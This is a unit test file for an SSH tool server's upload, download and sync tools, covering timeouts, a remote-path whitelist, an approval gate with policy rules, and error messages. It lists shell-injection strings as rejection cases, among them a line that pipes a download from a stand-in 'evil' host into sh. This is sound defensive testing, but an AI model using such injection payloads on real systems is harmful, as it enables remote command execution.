    writeConfig('Host web\n')
    let release!: (r: InputResponse) => void
    const { client, asks } = await open({
      respond: () => new Promise<InputResponse>((r) => (release = r))
    })

    const ac = new AbortController()
    const pending = client.callTool({ name: 'download', arguments: xferArgs() }, undefined, {
      signal: ac.signal
    })
    while (asks.length === 0) await new Promise((r) => setTimeout(r, 1))

    ac.abort(new Error('user stopped the run'))
    await expect(pending).rejects.toThrow()

    release({ kind: 'ask', allowed: true })
    await new Promise((r) => setTimeout(r, 5))

    // 「用户点开卡片时早已中止，approve 后却还是传了」必须不发生
    expect(control.copy).toEqual([])
  })
})

// ─── 交给连接层的实参 ────────────────────────────────────────────────────

describe('ssh 内置服务器传输类工具的下发', () => {
  it('SSHS-U-161: upload / download 交给 sshCopy 的形状与方向', async () => {
    writeConfig('Host web\n')
    const { client } = await open({ sessionId: 's-xfer' })

    await callTool(client, 'upload', xferArgs({ localPath: 'a.txt', remotePath: '/srv/a.txt' }))
    await callTool(client, 'download', xferArgs({ localPath: 'b.txt', remotePath: '/srv/b.txt' }))

    expect(control.copy).toHaveLength(2)
    expect(Object.keys(control.copy[0]).sort()).toEqual([
      'alias',
      'configPath',
      'direction',
      'localPath',
      'remotePath',
      'sessionId',
      'signal',
      'timeoutSec'
    ])
    expect(control.copy[0]).toMatchObject({
      sessionId: 's-xfer',
      alias: 'web',
      direction: 'up',
      // 下发的是**解析后**的绝对路径，与过门时那个字符串是同一个
      localPath: '/ws/a.txt',
      remotePath: '/srv/a.txt',
      timeoutSec: 120,
      configPath
    })
    expect(control.copy[1]).toMatchObject({ direction: 'down', localPath: '/ws/b.txt' })
    expect(control.sync).toEqual([])
  })

  it('SSHS-U-162: sync 交给 sshSync，两个方向各自照原样带下去', async () => {
    writeConfig('Host web\n')
    const { client } = await open({ sessionId: 's-sync' })

    await callTool(client, 'sync', syncArgs({ localPath: '/ws/dist', remotePath: '/srv/dist' }))
    await callTool(client, 'sync', syncArgs({ direction: 'down', localPath: '/ws/back' }))

    expect(control.copy).toEqual([])
    expect(control.sync).toHaveLength(2)
    expect(control.sync[0]).toMatchObject({
      sessionId: 's-sync',
      alias: 'web',
      direction: 'up',
      localPath: '/ws/dist',
      remotePath: '/srv/dist',
      configPath
    })
    expect(control.sync[1]).toMatchObject({ direction: 'down', localPath: '/ws/back' })
  })

  it('SSHS-U-163: 超时的取值与钳位，三个工具与 exec 共用同一道', async () => {
    writeConfig('Host web\n')
    const { client } = await open()

    for (const [name, args] of ALL_TRANSFERS) {
      for (const timeout of [undefined, 45, 0.5, 999999999, 0, -5, 'abc']) {
        await callTool(client, name, args({ timeout }))
      }
    }
    // 两头都要夹住，而且是同一类错误：floor 把 0.5 变成 0（立刻超时），
    // 而超过 2^31-1 毫秒会被 setTimeout 截成 1ms（同样立刻超时）
    const expected = [120, 45, 1, 3600, 120, 120, 120]
    expect(control.copy.map((c) => c.timeoutSec)).toEqual([...expected, ...expected])
    expect(control.sync.map((c) => c.timeoutSec)).toEqual(expected)
  })

  it('SSHS-U-164: 这台机器没有 rsync → sync 回一句「装了才有」，一次也不下发', async () => {
    writeConfig('Host web\n')
    control.rsync = false
    const { client } = await open()

    const r = await callTool(client, 'sync', syncArgs())
    expect(r.isError).toBe(true)
    expect(textOf(r)).toBe(
      'rsync is not installed on this machine, so directory sync is unavailable.'
    )
    // 工具面上本来就没有它（SSHS-U-127），但模型照名字硬调一次也得到一句人话，
    // 而不是一条 spawn 失败 —— 而且连路径门都不必惊动
    expect(gate.pathCalls).toEqual([])
    expect(control.sync).toEqual([])
  })
})

// ─── sync 的远端路径：白名单 + 命令门 ────────────────────────────────────
//
// rsync 不像 scp 那样有协议字段可放路径：它把远端路径塞进一条交给 ssh 的 argv，
// 而 ssh 会把剩余参数用空格拼成一条命令交给远端**登录 shell** 求值。
// 少列一个危险字符的代价就是远端命令执行，所以这里是白名单而不是黑名单。

describe('ssh 内置服务器 sync 的远端路径白名单', () => {
  const UNSAFE = [
    ['注入的原型', '/tmp/x; curl http://evil|sh'],
    ['与号', '/tmp/a && id'],
    ['反引号', '/tmp/`id`'],
    ['命令替换', '/tmp/$(id)'],
    ['管道', '/tmp/a|b'],
    // 两头的空白会被 trim 掉，所以危险字符必须放在中间才试得到白名单
    ['中间的空格', '/tmp/a b'],
    ['通配', '/tmp/*'],
    ['中间的换行', '/tmp/a\nb'],
    ['引号', '/tmp/a"b']
  ] as const

  it.each(UNSAFE)('SSHS-U-165（%s）: 远端路径被回绝，且一个进程都不起', async (_l, remotePath) => {
    writeConfig('Host web\n')
    const { client } = await open()

    const r = await callTool(client, 'sync', syncArgs({ remotePath }))
    expect(r.isError).toBe(true)
    expect(textOf(r)).toBe(
      `The remote path ${JSON.stringify(remotePath)} contains characters that rsync would hand to the remote shell. Use only letters, digits and ._/@+:=- (a leading ~ is allowed). For anything else use exec, or upload/download, which pass the path over SFTP instead.`
    )
    expect(control.sync).toEqual([])
    // 白名单在**命令门之前**：一条注定不会跑的命令不该弹一张卡片
    expect(gate.calls).toEqual([])
  })

  it.each([
    ['寻常绝对路径', '/srv/app'],
    ['前导波浪号', '~/deploy'],
    ['点、横线、下划线', '/tmp/a-b_c.d'],
    ['冒号', '/var/log/x:y']
  ])('SSHS-U-165（%s）: 照常放行', async (_l, remotePath) => {
    writeConfig('Host web\n')
    const { client } = await open()

    const r = await callTool(client, 'sync', syncArgs({ remotePath }))
    expect(r.isError).toBeFalsy()
    expect(control.sync[0]).toMatchObject({ remotePath })
  })
})

describe('ssh 内置服务器 sync 的命令门', () => {
  it('SSHS-U-166: 上报的是远端真的会执行的那条 `rsync --server`，两个方向不同', async () => {
    writeConfig('Host web\n')
    const { client } = await open()

    await callTool(client, 'sync', syncArgs({ remotePath: '/srv/app' }), {
      'shuvix.dev/toolCallId': 'tc-s1'
    })
    await callTool(client, 'sync', syncArgs({ direction: 'down', remotePath: '/srv/app' }))

    // 一次 sync 会遍历整棵目录树，而 enforcePath 只看得到根 —— 上传可能把 ~/.ssh
    // 整个送出去，下载可能往里写 authorized_keys，而这两件事路径策略一次没被问到
    expect(gate.calls).toHaveLength(1 + 1)
    expect(gate.calls[0].object).toStrictEqual({
      channel: 'ssh',
      command: 'rsync --server -logDtpre.iLsfxCIvu . /srv/app',
      host: 'web'
    })
    // down 多一个 `--sender`：远端是发送方，语义与上传完全不同
    expect(gate.calls[1].object).toStrictEqual({
      channel: 'ssh',
      command: 'rsync --server --sender -logDtpre.iLsfxCIvu . /srv/app',
      host: 'web'
    })
    expect(gate.calls[0].opts).toStrictEqual({
      toolCallId: 'tc-s1',
      toolName: 'mcp__ssh__sync',
      description: 'Sync to "web": /ws/report.txt <-> /srv/app',
      abortError: 'Aborted',
      // exec 那边一样：反馈作为正常结果带回，而不是抛
      onOther: 'return',
      missingChannel: 'deny'
    })
  })

  it('SSHS-U-167: 命令门 deny → 这次 sync 整个停住', async () => {
    writeConfig('Host web\n')
    gate.policies.push(
      userPolicy('no-rsync', [
        { effect: 'deny', match: "object.type == 'command' && object.channel == 'ssh'" }
      ])
    )
    const { client } = await open()

    // direction up + 工作目录内的本地路径 → 路径门直接放行，于是这里只剩命令门这一个变量
    await expect(
      client.callTool({ name: 'sync', arguments: syncArgs({ remotePath: '/srv/app' }) })
    ).rejects.toThrow(/Denied by security policy rule 'no-rsync#0'/)
    expect(control.sync).toEqual([])
  })

  it('SSHS-U-168: 合成出来的这条命令过的是**结构**解析，而不只是一个字符串', async () => {
    writeConfig('Host web\n')
    // block-catastrophic-commands 是唯一读结构事实（object.commands）的内置策略，
    // 而它的那几条规则要的是 rm / mkfs / dd —— 白名单已经把能写出这些的字符全挡了，
    // 所以拿一条同样读 object.commands 的用户策略来问「结构事实到底在不在」
    gate.policies.push(
      userPolicy('rsync-structure', [
        {
          effect: 'deny',
          // 开头那道 `object.type == 'command'` 不是装饰，而是引擎写规则的惯用法：
          // 路径客体上没有 `commands` 属性，而缺失属性是 strict 语义 —— 谓词抛错时
          // deny 走 fail-safe「视为命中」。没有这道守卫，这条规则会在**路径门**上以
          // 同样的文案 deny（试过：结果是一条 isError），于是用例证明的就成了那条兜底，
          // 而不是结构事实真的在。CEL 的 `&&` 会吸收另一侧已定值时的错误，所以守卫有效；
          // 规则级的 `action:` 条件做不到这件事 —— 它是与 CEL 之外相 AND 的原生谓词
          match:
            "object.type == 'command' && object.commands.exists(c, c.base == 'rsync' && c.argv.exists(a, a == '--server'))"
        }
      ])
    )
    const { client } = await open()

    await expect(
      client.callTool({ name: 'sync', arguments: syncArgs({ remotePath: '/srv/app' }) })
    ).rejects.toThrow(/rsync-structure#0/)
    expect(gate.pathCalls).toHaveLength(1)
    expect(control.sync).toEqual([])
  })

  it('SSHS-U-169: 命令门上改说「其它」→ 一条**非错误**结果，什么也没跑', async () => {
    writeConfig('Host web\n')
    const { client } = await open({
      respond: async () => ({ kind: 'other', text: 'sync the other way round' })
    })
    // 免询问关着，所以这一跳必然停在 ask-on-command 上（本地路径在工作目录内，路径门放行）
    const r = await callTool(client, 'sync', syncArgs({ remotePath: '/srv/app' }))

    expect(r.isError).toBeFalsy()
    expect(textOf(r)).toBe(
      'Sync was not performed. User responded with feedback instead:\nsync the other way round'
    )
    expect(control.sync).toEqual([])
  })

  it('SSHS-U-170: upload / download **不**过命令门 —— 白名单与命令门是 sync 独有的', async () => {
    writeConfig('Host web\n')
    const { client } = await open()

    // scp 走 SFTP：路径是协议里的一个字段，原样抵达，不经任何 shell。
    // 所以这两个工具既不需要白名单，也没有「远端会执行的那条命令」可上报
    await callTool(client, 'upload', xferArgs({ remotePath: '/tmp/x; curl http://evil|sh' }))
    await callTool(client, 'download', xferArgs({ remotePath: '/tmp/$(id)' }))

    expect(gate.calls).toEqual([])
    expect(control.copy.map((c) => c.remotePath)).toEqual([
      '/tmp/x; curl http://evil|sh',
      '/tmp/$(id)'
    ])
  })
})

// ─── 传输结果的翻译 ──────────────────────────────────────────────────────

describe('ssh 内置服务器传输结果的翻译', () => {
  it('SSHS-U-171: 成功那一句四种说法，输出只在非空时附上', async () => {
    writeConfig('Host web\n')
    const { client } = await open()

    expect(textOf(await callTool(client, 'upload', xferArgs()))).toBe('Upload to "web" done.')
    expect(textOf(await callTool(client, 'download', xferArgs()))).toBe('Download from "web" done.')
    expect(textOf(await callTool(client, 'sync', syncArgs()))).toBe('Sync to "web" done.')
    expect(textOf(await callTool(client, 'sync', syncArgs({ direction: 'down' })))).toBe(
      'Sync from "web" done.'
    )

    // 有话说就附上（rsync 的统计、scp 的提示）
    control.transfer = { stdout: 'sent 12 bytes', stderr: '', exitCode: 0, timedOut: false }
    expect(textOf(await callTool(client, 'sync', syncArgs()))).toBe(
      'Sync to "web" done.\nsent 12 bytes'
    )
    // 只有空白就别附 —— 一行空白让模型以为工具还说了点什么
    control.transfer = { stdout: '  \n', stderr: '\t', exitCode: 0, timedOut: false }
    expect(textOf(await callTool(client, 'upload', xferArgs()))).toBe('Upload to "web" done.')
  })

  it('SSHS-U-172: 255 + 认得出的 stderr → 翻成可操作的说明，三个工具一致', async () => {
    writeConfig('Host web\n')
    control.transfer = {
      stdout: '',
      stderr: 'Host key verification failed.',
      exitCode: 255,
      timedOut: false
    }
    const { client } = await open()

    for (const [name, args] of ALL_TRANSFERS) {
      const r = await callTool(client, name, args())
      expect(r.isError).toBe(true)
      // ShuviX 不代写 known_hosts —— 这一句和 exec 的是同一张表
      expect(textOf(r)).toContain('ShuviX will not add it')
      expect(textOf(r)).toContain('"web"')
    }
  })

  it('SSHS-U-173: 255 但远端有输出 → 那不是 ssh 的错，不翻译', async () => {
    writeConfig('Host web\n')
    control.transfer = {
      stdout: 'scp said something',
      stderr: 'Host key verification failed.',
      exitCode: 255,
      timedOut: false
    }
    const { client } = await open()

    const r = await callTool(client, 'upload', xferArgs())
    expect(textOf(r)).not.toContain('ShuviX will not add it')
    // 落回「原样带回退出码」那条路
    expect(textOf(r)).toBe('Upload to "web" failed (exit 255): Host key verification failed.')
  })

  it('SSHS-U-174: 超时说「超时」，秒数用的是**钳位之后**那个', async () => {
    writeConfig('Host web\n')
    control.transfer = { stdout: '', stderr: '', exitCode: 124, timedOut: true }
    const { client } = await open()

    expect(textOf(await callTool(client, 'upload', xferArgs({ timeout: 45 })))).toBe(
      'Upload to "web" timed out after 45s.'
    )
    // 报 0.5 只会让人去查一个根本没用上的数字：真正等的是钳位后的 1 秒
    expect(textOf(await callTool(client, 'sync', syncArgs({ timeout: 0.5 })))).toBe(
      'Sync to "web" timed out after 1s.'
    )
  })

  it('SSHS-U-175: 其余非零 → `failed (exit N)`，没输出时给一句 `(no output)`', async () => {
    writeConfig('Host web\n')
    control.transfer = { stdout: '', stderr: 'scp: no such file', exitCode: 1, timedOut: false }
    const { client } = await open()

    expect(textOf(await callTool(client, 'download', xferArgs()))).toBe(
      'Download from "web" failed (exit 1): scp: no such file'
    )

    control.transfer = { stdout: '', stderr: '   ', exitCode: 23, timedOut: false }
    const r = await callTool(client, 'sync', syncArgs({ direction: 'down' }))
    expect(r.isError).toBe(true)
    expect(textOf(r)).toBe('Sync from "web" failed (exit 23): (no output)')
  })

  it('SSHS-U-176: 连接层自己起不来时，原因原样冒到调用方', async () => {
    writeConfig('Host web\n')
    control.transfer = new Error('The `scp` command was not found on this machine.')
    const { client } = await open()

    await expect(client.callTool({ name: 'upload', arguments: xferArgs() })).rejects.toThrow(
      /`scp` command was not found/
    )
  })

  it('SSHS-U-177: 状态条只在真有 control socket 时点亮，失败的传输不点', async () => {
    writeConfig('Host web\n')
    const { client, events } = await open()

    // scp 会在 argv 更靠前的位置塞 `-oControlMaster=no`，而 OpenSSH 先到先得 ——
    // 于是一次独立的传输会复用已有 master，却从不新建。无条件点亮的话，
    // 同一个会话里 list-hosts 会给出相反的答案
    await callTool(client, 'upload', xferArgs())
    expect(events).toEqual([])

    control.connected.push('web')
    await callTool(client, 'upload', xferArgs())
    expect(events).toEqual([
      {
        type: 'runtime_event',
        runtimeId: 'ssh',
        status: { label: 'web', icon: 'Terminal', color: '#38bdf8' }
      }
    ])

    // 失败的那次连 socket 都不查 —— 状态条说的是「最后一次传成了的」
    events.length = 0
    control.transfer = { stdout: '', stderr: 'boom', exitCode: 1, timedOut: false }
    await callTool(client, 'upload', xferArgs())
    expect(events).toEqual([])
  })
})

// ─── 装配期对账 ──────────────────────────────────────────────────────────

describe('内置能力服务器的清单', () => {
  it('SSHS-U-41: 工厂表的键与迁移种下的内置行同名（v22 种 ssh，v27 种 browser，v28 种 database）', () => {
    // 两边对不上 = 会话里勾了这台服务器、建连时 registry 抛「No builtin MCP server registered」。
    // 新增一台内置能力服务器 = 工厂表加一行 + 一条种子迁移，这条用例就是那对括号。
    // v22 把名字写死在 SQL 里，v27 / v28 用绑定参数（(id, name, createdAt, updatedAt)）—— 两种都认
    const seeded = new Set<string>()
    const db = {
      prepare: (sql: string) => ({
        // v27 / v28 先查「内置行在不在 / 名字有没有被占」：空库，一律没有
        get: (): undefined => undefined,
        run: (...args: unknown[]): void => {
          if (!/INSERT[\s\S]*INTO\s+mcp_servers/i.test(sql) || !/'inproc'/.test(sql)) return
          const literal = /VALUES\s*\(\s*\?\s*,\s*'([^']+)'\s*,\s*'inproc'/i.exec(sql)
          const name = literal ? literal[1] : args[1]
          if (typeof name === 'string') seeded.add(name)
        }
      }),
      exec: (): void => {}
    }

    for (const version of [22, 27, 28]) {
      const m = migrations.find((x) => x.version === version)
      expect(m, `迁移 v${version} 应当存在（内置能力服务器的种子）`).toBeDefined()
      m!.up(db as unknown as Parameters<(typeof migrations)[number]['up']>[0])
    }

    expect([...seeded].sort()).toEqual(['browser', 'database', 'ssh'])
    expect(Object.keys(BUILTIN_MCP_FACTORIES).sort()).toEqual([...seeded].sort())
  })
})
